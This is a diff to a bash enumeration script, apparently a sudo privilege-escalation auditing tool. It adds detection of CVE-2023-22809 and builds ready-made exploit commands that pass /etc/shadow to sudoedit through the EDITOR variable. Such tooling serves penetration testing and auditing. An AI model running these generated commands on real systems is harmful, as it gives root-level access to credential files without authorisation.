@@ -116,6 +116,7 @@ echo -e "${BLUE} @TH3_ACE - BLAIS David"
 echo -e "${BLUE} Contribute and collaborate to the KILLER project @ https://github.com/TH3xACE"
 echo -e "${RED} Please consider to give a +1 star on github to show your support! ${RESET}"
 echo -e "\n" 
+echo -e "${RED} IMPORTANT! Always run the latest version, run a git pull or download the project again. ${RESET}"
 echo -e "${BOLD}${GREEN}[+] Intro ${RESET}" 
 echo -e "${BOLD}${YELLOW}Scan started at:${RESET}"; date 
 echo -e "\n"
@@ -493,15 +494,31 @@ if [ "$sudoeditrockchk" ]; then
     echo -e "${BOLD}${GREEN}[+] Checking for the vulnerability CVE-2023-22809${RESET}"
     echo -e "${BOLD}${RED}[-] Vulnerable to CVE-2023-22809${RESET}"
     echo -e "[-] current $sudover | vuln version: 1.8.0 to 1.9.12p1 inclusive"
-    echo -e "[*] Run one of the command: "
+    echo -e "[*] Run one of the command (No Password Required): "
     echo -e "$sudoeditrock"
     echo -e "[+] Tested editor: vi and vim, the file is /etc/shadow here but can be any file"
     echo -e "[*] Notes: /exploits/CVE-2023-22809.txt"
     #echo -e "[*] Exploit: "
     echo -e "\n"
-   #fi
-    
+   #fi    
   fi
+  
+  sudoeditrocknp=$(echo "$cmd" 2>/dev/null | grep -i "(root) sudoedit /\|(ALL : ALL) sudoedit" | sed -e "s/(root) /EDITOR='vi -- \/etc\/shadow' /g" | sed -e "s/(ALL : ALL) /EDITOR='vi -- \/etc\/shadow' /g")
+  if [ "$sudoeditrocknp" ]; then
+    echo -e "${BOLD}${GREEN}[+] Checking for the vulnerability CVE-2023-22809${RESET}"
+    echo -e "${BOLD}${RED}[-] Vulnerable to CVE-2023-22809${RESET}"
+    echo -e "[-] current $sudover | vuln version: 1.8.0 to 1.9.12p1 inclusive"
+    echo -e "[*] Run one of the command (User's password required): "
+    echo -e "$sudoeditrocknp"
+    echo -e "[+] Tested editor: vi and vim, the file is /etc/shadow here but can be any file"
+    echo -e "[*] Notes: /exploits/CVE-2023-22809.txt"
+    #echo -e "[*] Exploit: "
+    echo -e "\n"
+
+  fi
+  
+  
+  
 fi
 
 }
